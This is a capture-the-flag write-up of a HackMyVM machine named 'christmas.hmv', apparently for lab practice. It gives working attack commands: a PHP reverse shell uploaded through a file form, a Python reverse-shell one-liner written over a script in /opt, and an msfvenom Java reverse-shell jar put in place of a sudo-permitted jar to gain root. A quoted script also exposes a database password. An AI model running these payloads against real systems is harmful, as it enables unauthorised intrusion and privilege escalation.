@@ -1,1 +1,515 @@
+			ENUMERATION
+
+
+---ifconfig---
+
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 153467  bytes 21921068 (20.9 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 157441  bytes 11809147 (11.2 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 28  bytes 1712 (1.6 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 28  bytes 1712 (1.6 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+             
+
+
+---netdiscover---
+                                                                                                                        
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                       
+                                                                                                       
+ 8 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 480                                       
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      2     120  Unknown vendor                                      
+ 10.0.2.2        52:54:00:12:35:00      2     120  Unknown vendor                                      
+ 10.0.2.3        08:00:27:1a:41:b1      2     120  PCS Systemtechnik GmbH                              
+ 10.0.2.39       08:00:27:b1:ae:10      2     120  PCS Systemtechnik GmbH                              
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+              
+
+
+
+
+---nmap---
+                                                                                                              
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.39 -sS -sC -sV -A -T4 -p-  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 15:40 +03
+Nmap scan report for christmas.hmv (10.0.2.39)
+Host is up (0.00064s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 a6:3e:0b:65:85:2c:0c:5e:47:14:a9:dd:aa:d4:8c:60 (ECDSA)
+|_  256 99:72:b5:6e:1a:9e:70:b3:24:e0:59:98:a4:f9:d1:25 (ED25519)
+80/tcp open  http    Apache httpd 2.4.55
+|_http-server-header: Apache/2.4.55 (Ubuntu)
+|_http-title: Merry Christmas
+MAC Address: 08:00:27:B1:AE:10 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.64 ms christmas.hmv (10.0.2.39)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.91 seconds
+                                           
+
+---I see that there is a subdomain name so I add it to the hosts---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nano /etc/hosts     
+
+10.0.2.39 christmas.hmv
+
+
+
+---after that I ran a dirb scan and found some pages---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# dirb http://christmas.hmv
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Apr 22 16:43:24 2024
+URL_BASE: http://christmas.hmv/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://christmas.hmv/ ----
+==> DIRECTORY: http://christmas.hmv/css/                                                                       
+==> DIRECTORY: http://christmas.hmv/fonts/                                                                     
+==> DIRECTORY: http://christmas.hmv/images/                                                                    
++ http://christmas.hmv/index.php (CODE:200|SIZE:23200)                                                         
+==> DIRECTORY: http://christmas.hmv/javascript/                                                                
+==> DIRECTORY: http://christmas.hmv/js/                                                                        
+==> DIRECTORY: http://christmas.hmv/php/                                                                       
++ http://christmas.hmv/server-status (CODE:403|SIZE:278)                                                       
+==> DIRECTORY: http://christmas.hmv/uploads/                                                                   
+                                                                                                               
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+
+---- Entering directory: http://christmas.hmv/uploads/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                               
+---- Entering directory: http://christmas.hmv/javascript/jquery/ ----
++ http://christmas.hmv/javascript/jquery/jquery (CODE:200|SIZE:289782)                                         
+                                                                                                               
+-----------------
+END_TIME: Mon Apr 22 16:43:44 2024
+DOWNLOADED: 13836 - FOUND: 3
+
+
+
+
+---there is a christmas.hmv/uploads page, its empty at the moment, lets take a look at the webpage also---
+
+
+---In the website I see that there is a file upload section, so we can try to get a reverse shell with a php file---
+
+---In the website we find a list of names, I save them into a file named list.txt---
+
+---I use my rev.php file for it---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# cat rev.php
+<?php
+ 
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.0.2.15';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+
+
+---now lets upload this into website, after that we can probably acces our file from the /uploads page---
+
+---We come to the uplaods page and here is our php file, lets set our listener and then establish our connection---
+
+
+						
+		
+						GAINING FOOTHOLD
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 4444
+listening on [any] 4444 ...
+
+
+---I click on the php file---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.39] 50700
+Linux xmas 6.2.0-36-generic #37-Ubuntu SMP PREEMPT_DYNAMIC Wed Oct  4 10:14:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+ 13:49:59 up  1:16,  0 user,  load average: 8.02, 5.64, 2.71
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+---we're in, lets check what we can do in this terminal---
+
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")';
+www-data@xmas:/$ ls
+ls
+bin    dev   lib    libx32	mnt   root  snap      sys  var
+boot   etc   lib32  lost+found	opt   run   srv       tmp
+cdrom  home  lib64  media	proc  sbin  swap.img  usr
+www-data@xmas:/$ cd home
+cd home
+www-data@xmas:/home$ ls
+ls
+alabaster  bushy  pepper  santa  shinny  sugurplum  wunorse
+
+
+
+---upgrade our shell to tty and then check around for info---
+
+
+---I tried getting into all of the user folders but we dont have any permission, so I keep on checking---
+
+
+www-data@xmas:/var/www/html$ cd /opt
+cd /opt
+www-data@xmas:/opt$ ls
+ls
+NiceOrNaughty
+www-data@xmas:/opt$ cd Ni	
+cd NiceOrNaughty/
+www-data@xmas:/opt/NiceOrNaughty$ ls
+ls
+nice_or_naughty.py
+
+
+---Here we find a python file, lets take a look at it--- 
+
+
+Not: You can also use a tool like linpeas here but I did some manuel enumeration, which was also fast so I didn't
+need a tool
+
+
+
+
+www-data@xmas:/opt/NiceOrNaughty$ cat n	
+cat nice_or_naughty.py 
+import mysql.connector
+import random
+import os
+
+# Check the wish lists directory
+directory = "/var/www/christmas.hmv/uploads"
+# Connect to the mysql database christmas
+mydb = mysql.connector.connect(
+    host="localhost",
+    user="root",
+    password="ChristmasMustGoOn!",
+    database="christmas"
+)
+
+#Read the names of the wish list
+.
+.
+.
+.
+.
+---so this code is used to add users to the database for the nice or naughty list--- 
+
+
+---but we can change the content of this code and create another reverse connection so we find a way to upgrade
+our privileges--- 
+
+
+
+---I find a python reverse shell connection code, I will write it over this python file using echo---
+
+
+www-data@xmas:/opt/NiceOrNaughty$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",4040));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > nice_or_naughty.py
+
+
+---open our nc listener---
+
+                                                                                                                         
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 4040
+listening on [any] 4040 ...
+
+
+
+NOT: İkinci denememde yaptığımda dinleme yapmak için rlwrap nc -lvnp 5050 kullandım ve python
+dosyasını çalıştırmadan bile bağlantı sağlayabildim. rlwrap daha çabuk sonuç verdi. 
+
+
+
+---lets execute the python file---
+
+www-data@xmas:/opt/NiceOrNaughty$ python3 nice_or_naughty.py 
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 4040
+listening on [any] 4040 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.39] 42256
+alabaster@xmas:~$ whoami
+whoami
+alabaster
+alabaster@xmas:~$ cd /home
+cd /home
+alabaster@xmas:/home$ 
+
+
+---now we are finally in as the alabaster, lets look around---
+
+
+alabaster@xmas:/home$ ls
+ls
+alabaster  bushy  pepper  santa  shinny  sugurplum  wunorse
+alabaster@xmas:/home$ cd ala	
+cd alabaster/
+alabaster@xmas:~$ ls
+ls
+naughty_list.txt  nice_list.txt  NiceOrNaughty	PublishList  user.txt
+alabaster@xmas:~$ cat us	
+cat user.txt 
+
+    ||::|:||   .--------,
+    |:||:|:|   |_______ /        .-.
+    ||::|:|| ."`  ___  `".    {\('v')/}
+    \\\/\///:  .'`   `'.  ;____`(   )'___________________________
+     \====/ './  o   o  \|~     ^" "^                          //
+      \\//   |   ())) .  |   Merry Christmas!                   \
+       ||     \ `.__.'  /|                                     //
+       ||   _{``-.___.-'\|   Flag: HMV{---First User Flag---}    \
+       || _." `-.____.-'`|    ___                              //
+       ||`        __ \   |___/   \______________________________\
+     ."||        (__) \    \|     /
+    /   `\/       __   vvvvv'\___/
+    |     |      (__)        |
+     \___/\                 /
+       ||  |     .___.     |
+       ||  |       |       |
+       ||.-'       |       '-.
+       ||          |          )
+       ||----------'---------'
+
+
+
+
+
+
+					PRIVILEGE ESCALATION
+
+
+alabaster@xmas:~$ sudo -l
+sudo -l
+Matching Defaults entries for alabaster on xmas:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User alabaster may run the following commands on xmas:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /usr/bin/java -jar
+        /home/alabaster/PublishList/PublishList.jar
+
+
+---here we see alabaster has suid permissions to run these commands, lets run it---
+
+
+
+alabaster@xmas:/usr/bin$ sudo /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
+<va -jar /home/alabaster/PublishList/PublishList.jar
+Files copied successfully!
+
+
+
+---it says files are copied somewhere, we dont know where, lets check the publishlist folder---
+
+
+
+alabaster@xmas:/usr/bin$ cd /home/alabaster/PublishList
+cd /home/alabaster/PublishList
+
+alabaster@xmas:~/PublishList$ ls -la 
+ls -la
+total 28
+drwxrwxr-x 2 alabaster alabaster 4096 Nov 20 18:45 .
+drwxr-x--- 7 alabaster alabaster 4096 Nov 20 18:43 ..
+-rw-rw-r-- 1 alabaster alabaster   38 Nov 20 18:45 manifest.mf
+-rw-rw-r-- 1 alabaster alabaster   24 Nov 20 18:44 MANIFEST.MF
+-rw-rw-r-- 1 alabaster alabaster 1760 Nov 20 18:45 PublishList.class
+-rw-rw-r-- 1 alabaster alabaster 1477 Nov 20 18:45 PublishList.jar
+-rw-rw-r-- 1 alabaster alabaster 1182 Nov 20 18:44 PublishList.java
+
+
+
+---we see that there are multiple files including the source code of java file, and we own them all---
+
+
+---so to escalate our privileges we can create a java (jar) reverse shell using msfvenom, upload it into the victim
+machine and then replace it with the current jar file in the victims machine---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# msfvenom -p java/shell_reverse_tcp LHOST=10.0.2.15 LPORT=7070 -f jar -o xmasshell.jar
+Payload size: 7500 bytes
+Final size of jar file: 7500 bytes
+Saved as: xmasshell.jar
+                                            
+
+---start our server to upload it---
+                                                   
+┌──(root㉿kali)-[/home/okina]
+└─# python3 -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.0.2.39 - - [22/Apr/2024 19:18:49] "GET /xmasshell.jar HTTP/1.1" 200 -
+
+
+alabaster@xmas:~/PublishList$ wget http://10.0.2.15:80/xmasshell.jar
+wget http://10.0.2.15:80/xmasshell.jar
+--2024-04-22 16:18:49--  http://10.0.2.15/xmasshell.jar
+Connecting to 10.0.2.15:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7500 (7.3K) [application/java-archive]
+Saving to: ‘xmasshell.jar’
+
+xmasshell.jar       100%[===================>]   7.32K  --.-KB/s    in 0s      
+
+2024-04-22 16:18:49 (1.10 GB/s) - ‘xmasshell.jar’ saved [7500/7500]
+
+
+
+---now I will rename the files so in case one of them gets overwritten (which in my case did) we can revert back
+by downloading the virus again---
+
+
+alabaster@xmas:~/PublishList$ mv PublishList.jar PublishList.bak
+mv PublishList.jar PublishList.bak
+alabaster@xmas:~/PublishList$ mv xmasshell.jar PublishList.jar
+mv xmasshell.jar PublishList.jar
+
+
+
+---now that our shell is ready lets open up yet another listener and execute our reverse shell---
+
+---the port of reverse connection was 7070---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 7070
+listening on [any] 7070 ...
+
+
+alabaster@xmas:~/PublishList$ sudo /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
+<va -jar /home/alabaster/PublishList/PublishList.jar
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 7070
+listening on [any] 7070 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.39] 34680
+whoami
+root
+
+
+---boom, we are root---
+
+
+cd /root
+ls
+root.txt
+snap
+cat root.txt
+      __,_,_,___)          _______
+    (--| | |             (--/    ),_)        ,_) 
+       | | |  _ ,_,_        |     |_ ,_ ' , _|_,_,_, _  ,
+     __| | | (/_| | (_|     |     | ||  |/_)_| | | |(_|/_)___,
+    (      |___,   ,__|     \____)  |__,           |__,
+
+                            |                         _...._
+                         \  _  /                    .::o:::::.
+                          (\o/)                    .:::'''':o:.
+                      ---  / \  ---                :o:_    _:::
+                           >*<                     `:}_>()<_{:'
+                          >0<@<                 @    `'//\\'`    @ 
+                         >>>@<<*              @ #     //  \\     # @
+                        >@>*<0<<<           __#_#____/'____'\____#_#__
+                       >*>>@<<<@<<         [__________________________]
+                      >@>>0<<<*<<@<         |=_- .-/\ /\ /\ /\--. =_-|
+                     >*>>0<<@<<<@<<<        |-_= | \ \\ \\ \\ \ |-_=-|
+                    >@>>*<<@<>*<<0<*<       |_=-=| / // // // / |_=-_|
+      \*/          >0>>*<<@<>0><<*<@<<      |=_- |`-'`-'`-'`-'  |=_=-|
+  ___\\U//___     >*>>@><0<<*>>@><*<0<<     | =_-| o          o |_==_| 
+  |\\ | | \\|    >@>>0<*<<0>>@<<0<<<*<@<    |=_- | !     (    ! |=-_=|
+  | \\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<  _|-,-=| !    ).    ! |-_-=|_
+  |\ \| || / //||.*.*.*.|>>@<<*<<@>><0<<@</=-((=_| ! __(:')__ ! |=_==_-\
+  |\\_|_|&&_// ||*.*.*.*|_\\db//__     (\_/)-=))-|/^\=^=^^=^=/^\| _=-_-_\
+  """"|'.'.'.|~~|.*.*.*|     ____|_   =('.')=//   ,------------.      
+      |'.'.'.|   ^^^^^^|____|>>>>>>|  ( ~~~ )/   (((((((())))))))   
+      ~~~~~~~~         '""""`------'  `w---w`     `------------'
+      Flag HMV{---Root Flag User---}
+	       
+               
+
+
+
 
